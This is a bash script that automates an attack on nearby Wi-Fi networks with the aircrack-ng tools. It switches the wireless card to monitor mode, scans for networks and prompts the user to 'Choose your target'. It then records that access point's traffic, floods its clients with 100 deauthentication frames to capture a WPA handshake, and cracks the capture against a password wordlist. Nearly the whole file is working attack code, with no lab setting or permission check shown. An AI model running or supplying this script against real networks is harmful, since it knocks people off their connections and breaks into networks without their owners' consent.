#!/bin/bash
rm -f ./Aircrack-ng/data*
rm -f ./Aircrack-ng/dump*
rm -f ./Aircrack-ng/objective.txt
rm -f ./Aircrack-ng/target.txt
rm -f ./Aircrack-ng/pid.txt

wlan=$(ifconfig | grep wlan0 | awk '{print $1}')
wlan=${wlan%?}

echo -e '+---------------------------------------------------------+\n'

echo 'Wlan founded ['$wlan']'

if [ "$wlan" = "wlan0mon" ]
then
	echo 'Wlan Monitor already on'
	echo
elif [[ "$wlan" = "wlan0" || "$wlan" = "" ]]
then 
	echo 'Turn-on Wlan Monitor'
	echo
	airmon-ng check kill
	airmon-ng start wlan0
else
	echo 'Error Wlan not found'
fi

echo -e '+---------------------------------------------------------+\n'

gnome-terminal --title "pid" -- sh -c "top > ./Aircrack-ng/pid.txt | head -1" 
gnome-terminal --title "searchWifi" -- sh -c "airodump-ng -w ./Aircrack-ng/data wlan0mon" 
tsleep=2
progress=".........."
echo -ne 'Searching WI-FI   ['$progress']\r'
for i in {1..10}
do	
	progress=$(echo $progress | sed s/./#/$i)
	sleep $tsleep
	echo -ne 'Searching WI-FI   ['$progress']\r'
done
sleep 1
echo -ne '\n\n'
pid=$(cat ./Aircrack-ng/pid.txt | grep gnome- | head -1 | awk '{print $2}')
kill -9 $pid

echo -e '+---------------------------------------------------------+\n'

echo -e 'WI-FI founded\n'
awk 'BEGIN {FS = ","} ; {print $14}' ./Aircrack-ng/data-01.csv | sort | grep -v -e '^[[:space:]]*$' | sed 's/^ *//' | grep -v "ESSID" > ./Aircrack-ng/target.txt
awk '{print NR, "|" $0}' ./Aircrack-ng/target.txt
echo
read -p 'Choose your target: ' target
target=$(head -"$target" ./Aircrack-ng/target.txt | tail -1)
grep "$target" ./Aircrack-ng/data-01.csv > ./Aircrack-ng/objective.txt

echo -e '\n+---------------------------------------------------------+\n'

bssid=$(awk 'BEGIN {FS = ","} ; {print $1}' ./Aircrack-ng/objective.txt)
ch=$(awk 'BEGIN {FS = ","} ; {print $4}' ./Aircrack-ng/objective.txt | sed 's/^ *//')
echo "airodump-ng --bssid $bssid -c $ch --write dump wlan0mon"
gnome-terminal -- sh -c "airodump-ng --bssid '$bssid' -c '$ch' --write ./Aircrack-ng/dump wlan0mon"
tsleep=2
progress=".........."
echo -ne 'Dumping  ['$progress']\r'
for i in {1..10}
do	
	progress=$(echo $progress | sed s/./#/$i)
	sleep $tsleep
	echo -ne 'Dumping   ['$progress']\r'
done
sleep 1
echo -ne '\n\n'

echo -e '+---------------------------------------------------------+\n'

echo "aireplay-ng --deauth 100 -a $bssid wlan0mon"
#gnome-terminal --title "pid" -- sh -c "top > ./Aircrack-ng/pid.txt | head -1" 
gnome-terminal -- sh -c "aireplay-ng --deauth 100 -a '$bssid' wlan0mon"

echo -ne 'Sending...\n'
read -p "Press enter to continue"
echo -ne '\n\n'
#pid=$(cat ./Aircrack-ng/pid.txt | grep gnome- | head -1 | awk '{print $2}')
#kill -9 $pid

echo -e '+---------------------------------------------------------+\n'

echo 'Aircrack-ng'
aircrack-ng ./Aircrack-ng/dump-01.cap -w ./Aircrack-ng/password.txt

echo -e '+---------------------------------------------------------+\n'

echo 'Turn-off Wlan Monitor'
airmon-ng stop wlan0mon

echo -e '+---------------------------------------------------------+\n'

echo 'Removing extra files\n'
rm -f ./Aircrack-ng/data*
rm -f ./Aircrack-ng/dump*
rm -f ./Aircrack-ng/objective.txt
rm -f ./Aircrack-ng/target.txt
rm -f ./Aircrack-ng/pid.txt

echo -e '\n+---------------------------------------------------------+\n'
